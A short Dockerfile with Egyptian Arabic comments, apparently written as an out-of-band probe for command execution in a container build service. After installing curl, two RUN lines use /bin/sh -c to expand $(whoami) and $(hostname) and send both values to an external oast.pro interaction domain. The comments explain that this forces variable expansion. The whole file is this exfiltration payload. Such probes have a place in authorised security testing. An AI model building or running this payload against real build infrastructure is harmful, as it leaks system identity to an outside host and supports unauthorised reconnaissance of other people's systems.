FROM alpine:latest

# 1. نزل الأدوات
RUN apk add --no-cache curl

# 2. الحركة الفنية: استخدام /bin/sh -c
# ده بيجبر النظام يفتح تيرمينال ويفك المتغيرات الأول
# الأمر ده هيبعت: http://domain/root
RUN /bin/sh -c "curl http://d52fni83t4gh9b2pkpa0qgh49zgw34b31.oast.pro/$(whoami)"

# 3. زيادة تأكيد: هيبعت الـ hostname
RUN /bin/sh -c "curl http://d52fni83t4gh9b2pkpa0qgh49zgw34b31.oast.pro/$(hostname)"
